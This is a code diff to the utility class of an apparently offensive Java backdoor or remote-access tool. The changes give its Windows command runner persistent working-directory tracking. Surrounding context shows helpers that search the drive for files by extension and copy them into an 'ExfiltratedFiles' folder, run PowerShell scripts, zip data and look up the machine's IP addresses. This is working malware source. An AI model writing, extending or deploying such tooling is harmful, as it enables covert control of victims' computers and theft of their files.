@@ -10,7 +10,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.net.Inet4Address;
-import java.net.Inet6Address;
 import java.net.InetAddress;
 import java.net.NetworkInterface;
 import java.net.URL;
@@ -29,18 +28,27 @@ import org.apache.commons.io.IOUtils;
 
 public class Utils {
 
+	public static String currentCMDDirectory = System.getProperty("user.dir");
+
 	/**
 	 * Runs command {@code command} in the current machine's command prompt and
-	 * returns response.
+	 * returns response. If {@code dynamicWorkingDirectory} is set to true,
+	 * whenever the current directory changes, {@code currentCMDDirectory} is updated accordingly.
 	 *
-	 * @param command command to run
+	 * @param command                 command to run
+	 * @param dynamicWorkingDirectory if {@code currentCMDDirectory} should be updated
 	 * @return response from running command
 	 */
-	public static String runCommand(String command) {
+	public static String runCommand(String command, boolean dynamicWorkingDirectory) {
 		StringBuilder resp = new StringBuilder();
 		BufferedReader bufferedReader = null;
 		try {
-			ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
+			ProcessBuilder builder;
+			if (dynamicWorkingDirectory) {
+				builder = new ProcessBuilder("cmd.exe", "/c", command + " && echo current CMD path: && cd");
+				builder.directory(new File(currentCMDDirectory));
+			} else
+				builder = new ProcessBuilder("cmd.exe", "/c", command);
 			builder.redirectErrorStream(true);
 			bufferedReader = new BufferedReader(new InputStreamReader(builder.start().getInputStream()));
 			while (true) {
@@ -50,7 +58,10 @@ public class Utils {
 						resp = new StringBuilder(resp.substring(0, resp.length() - 1));
 					break;
 				}
-				resp.append(line).append("\n");
+				if (dynamicWorkingDirectory && line.startsWith("current CMD path:"))
+					currentCMDDirectory = bufferedReader.readLine();
+				else
+					resp.append(line).append("\n");
 			}
 			if (resp.toString().length() == 0)
 				return "Command did not produce a response";
@@ -71,14 +82,14 @@ public class Utils {
 	}
 
 	/**
-	 * Uses {@link #runCommand(String)} to run the PowerShell script with the name
+	 * Uses {@link #runCommand(String, boolean)} to run the PowerShell script with the name
 	 * {@code filename}.
 	 *
 	 * @param filename name of script to run
 	 * @return response from running script
 	 */
 	public static String runPSScript(String filename) {
-		return runCommand("Powershell.exe -executionpolicy remotesigned -File " + filename);
+		return runCommand("Powershell.exe -executionpolicy remotesigned -File " + filename, false);
 	}
 
 	/**
@@ -93,7 +104,7 @@ public class Utils {
 		new File(Backdoor.gatheredDir + "ExfiltratedFiles").mkdir();
 		for (String ext : exts)
 			for (String file : new ArrayList<>(
-					Arrays.asList(Utils.runCommand("c: && cd " + root + " && dir/b/s/a:-d *." + ext).split("\n"))))
+					Arrays.asList(Utils.runCommand("c: && cd " + root + " && dir/b/s/a:-d *." + ext, false).split("\n"))))
 				if (!file.equals("File Not Found"))
 					FileUtils.copyFile(new File(file), new File(
 							Backdoor.gatheredDir + "ExfiltratedFiles\\" + file.substring(file.lastIndexOf("\\") + 1)));
@@ -101,7 +112,7 @@ public class Utils {
 
 	/**
 	 * Compresses directory with name {@code dir} to zip file '{@code dir}.zip'.
-	 * 
+	 *
 	 * @param dir name of directory to compress
 	 * @throws IOException
 	 * @throws FileNotFoundException
@@ -116,7 +127,7 @@ public class Utils {
 	/**
 	 * Recursively adds the contents of directory {@code rootDir} to the
 	 * ZipOutputStream {@code out}.
-	 * 
+	 *
 	 * @param rootDir   root directory
 	 * @param sourceDir source directory
 	 * @param out       ZipOutputStream
@@ -143,10 +154,10 @@ public class Utils {
 
 	/**
 	 * Decompresses zip file with name {@code zipFileName}.
-	 * 
+	 *
 	 * @param zipFileName name of zip file to decompress
 	 * @return directory where contents of zip file with name {@code zipFileName}
-	 *         were copied
+	 * were copied
 	 * @throws IOException
 	 */
 	public static String unzip(String zipFileName) throws IOException {
@@ -161,7 +172,7 @@ public class Utils {
 			else {
 				entryDestination.getParentFile().mkdirs();
 				try (InputStream in = zipFile.getInputStream(entry);
-						OutputStream out = new FileOutputStream(entryDestination)) {
+				     OutputStream out = new FileOutputStream(entryDestination)) {
 					IOUtils.copy(in, out);
 				}
 			}
@@ -174,7 +185,7 @@ public class Utils {
 	 * If {@code ipType} is "internal", returns the internal IP address of the
 	 * current machine. Otherwise, if {@code ipType} is "external", returns the
 	 * external IP address of the current machine.
-	 * 
+	 *
 	 * @param ipType type of IP address to return
 	 * @return either the internal or external IP address of the current machine
 	 * @throws IOException
@@ -186,7 +197,7 @@ public class Utils {
 			while (majorInterfaces.hasMoreElements()) {
 				NetworkInterface inter = majorInterfaces.nextElement();
 				for (Enumeration<InetAddress> minorInterfaces = inter.getInetAddresses(); minorInterfaces
-						.hasMoreElements();) {
+						.hasMoreElements(); ) {
 					InetAddress add = minorInterfaces.nextElement();
 					if (!add.isLoopbackAddress())
 						if (add instanceof Inet4Address) {
